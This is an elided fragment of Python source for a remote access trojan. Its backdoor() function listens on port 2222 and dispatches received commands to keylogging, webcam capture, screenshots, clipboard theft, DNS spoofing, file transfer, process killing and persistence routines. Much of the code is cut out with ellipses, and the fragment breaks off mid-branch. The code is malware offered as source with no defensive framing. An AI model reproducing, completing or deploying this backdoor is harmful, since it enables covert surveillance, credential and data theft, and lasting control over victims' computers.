...
def backdoor():
    ...
    while True:
        ...
        port = 2222  # The connection port to use
            ...
            while 1:
                ...
                if received_command != 'KeepAlive':
                    if received_command == 'quit':
                        ...
                        break
                    elif received_command == 'kill':
                        sender('mistochiudendo')
                        # If thr_exit.set() next keystroke will terminate keylogger thread
                        thr_exit.set()
                        break
                    elif received_command == 'processlist':
                        listprocesses()
                    elif received_command == 'processkill':
                        killprocesses()
                    elif received_command == 'dnsstart':
                        dnsspoofer(dnsfile)
                    elif received_command == 'dnsstop':
                    ...
                    elif received_command == 'download':
                        downloader()
                    elif received_command == 'upload':
                        uploader()
                    elif received_command == 'Screenshot':
                        screenshot()
                    elif received_command == 'webcampic':
                        webcam_pic()
                    elif received_command == 'clipboard':
                        clip_copy()
                    elif received_command == 'keylogstatus':
                        keylogs_status()
                    elif received_command == 'keylogstart':
                        keylogs_start()
                    elif received_command == 'keylogstop':
                        keylogs_stop()
                    elif received_command == 'keylogdownload':
                        keylogs_download()
                    elif received_command == 'zersistenceenable':
                        if persistence_install():
                            sender('Persistence installation successful!')
                        else:
                            sender('Persistence already installed!')
                    elif received_command == 'persistencedisable':
                        if persistence_remove():
                            sender('Persistence remove successful!')
                        else:
                            sender('Persistence not yet installed!')
                    elif received_command == 'persistencestatus':
